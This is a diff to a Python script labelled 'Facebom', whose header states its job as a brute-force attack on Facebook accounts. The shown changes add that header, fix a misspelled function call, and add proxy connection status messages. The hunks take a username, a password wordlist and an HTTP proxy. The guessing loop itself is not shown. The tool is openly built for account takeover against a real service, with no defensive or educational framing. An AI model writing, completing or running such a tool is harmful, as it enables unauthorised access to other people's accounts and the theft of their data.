@@ -1,6 +1,11 @@
 #/usr/bin/python
 # -*- coding: utf-8 -*-
-#I Love Python(^-^)
+
+######################
+# SCRIPT : Facebom
+#    JOB : Brute Force Attack On Facebook Accounts
+#Codedby : Oseid Aldary
+######################
 try:
  ##--------------------- Import Libraries --------------------##
  import socket,time,os,optparse,mechanize,random,re,requests  ##
@@ -77,14 +82,17 @@ def FBOM(username, wordlist, proxy=None):
     except IOError:
         print(rd+"\n["+yl+""+yl+" No Such File: [ "+rd+str(wordlist)+yl+" ] "+rd+"!!!"+wi)
         exit(1)
-    if proxy !=None: 
+    if proxy !=None:
+        print(wi+"["+yl+"~"+wi+"] Checking "+yl+"HTTP "+wi+"Proxy[ {}:80 ]...".format(proxy if ":" not in proxy else proxy.split(":")[0]))
         if ":" not in proxy:
             if proxy.count(".") ==3:
                 if cpro(proxy) == True:
+                    print(wi+"["+gr+"Connected"+wi+"]")
                     useproxy = proxy+":80"
                 else:
+                    print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
                     useproxy = False
-                    print(rd+"\n["+yl+""+yl+" Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
+                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
                     exit(1)
             else:
                 useproxy = False
@@ -93,11 +101,13 @@ def FBOM(username, wordlist, proxy=None):
         else:
             proxy = proxy.split(":")[0]
             if proxy.count(".") ==3:
-                if cpor(proxy) == True:
+                if cpro(proxy) == True:
+                    print(wi+"["+gr+"Connected"+wi+"]")
                     useproxy = proxy+":80"
                 else:
+                    print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
                     useproxy = False
-                    print(rd+"\n["+yl+""+yl+" Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
+                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
                     exit(1)
             else:
                 useproxy = False
